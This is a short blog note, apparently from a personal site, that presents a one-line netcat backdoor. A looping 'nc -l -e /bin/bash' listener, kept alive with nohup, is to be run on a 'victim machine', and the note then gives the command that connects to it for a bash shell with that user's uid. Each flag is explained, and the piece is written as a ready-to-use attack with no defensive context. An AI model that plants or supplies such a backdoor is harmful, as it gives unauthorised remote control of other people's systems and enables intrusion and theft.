Title: Simple Backdoor by using NetCat  
Date: 2014-07-06 11:03  
Author: fkz  
Category: Note  
Tags: NetCat, nc, Backdoor, Security  
Slug: simple-backdoor-by-using-netcat  
Modified: 2015-10-27 12:13  
  
  
## The one line script  
```sh  
$ nohup bash -c 'while true; do nc -l -e /bin/bash -p ${port}; done' &  
```  
  
  
## How this works  
  
+ `nohup` makes this backdoor immune to SIGHUP  
+ `bash -c ${string}` will run the `${string}` as command  
+ `nc -l` let nc keep listening on the port  
+ `nc -e ${sth}` means excute `${sth}` after connected  
+ `nc -p` to choose a port for nc to listen  
+ `${port}` is the backdoor port set on the victim machine.  
    + You can change it to a port number whatever you like.  
+ use shell scripting `while` for keeping listening  
  
  
## How to use  
  
After run the command above on the victim machine, you can just type  
  
```sh  
$ nc ${victim_ip} ${port}  
```  
  
to connect to the victim machine and get a bash shell as the same uid which ran the command.  
